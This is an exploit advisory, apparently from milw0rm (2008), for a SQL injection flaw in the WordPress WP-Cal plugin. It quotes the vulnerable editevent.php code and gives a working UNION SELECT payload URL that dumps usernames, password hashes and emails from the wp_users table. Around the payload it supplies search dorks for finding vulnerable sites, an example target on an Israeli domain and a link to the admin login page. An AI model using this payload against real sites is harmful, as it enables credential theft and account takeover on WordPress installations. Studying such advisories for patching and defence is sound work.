@@ -1,0 +1,30 @@
+--------------------------------------------------------------
+        H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo
+--------------------------------------------------------------
+# Author : Houssamix From H-T Team
+# Script : Wordpress Plugin WP-Cal                                 
+# Download : http://www.fahlstad.se/wp-plugins/wp-cal/                         
+# BUG :  Remote SQL Injection Vulnerability  
+# Dorks : inurl:/wp-content/plugins/wp-cal/
+          inurl:/WP-Cal/
+
+## Vulnerable CODE :
+~~~~~~~ /wp-content/plugins/wp-cal/functions/editevent.php ~~~~~~~~~~~~~
+$id = $_GET['id'];
+	$event = $wpdb->get_row("SELECT * FROM $table WHERE id = $id");
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Exploit :
+/wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--
+
+Exemple :
+http://site.il/wordpress/wp-content/plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--
+
+admin login http://target.il/wordpress_path/wp/wp-login.php
+
+# Gr33tz : V40 (Stack-Terrorist) - Mahmood_ali - weliem & all muslims hackers  
+
+------------------------||  Viva Palestine ||------------------------------
+------------------------||  FREE GaZZA ||------------------------------
+
+# milw0rm.com [2008-01-27]
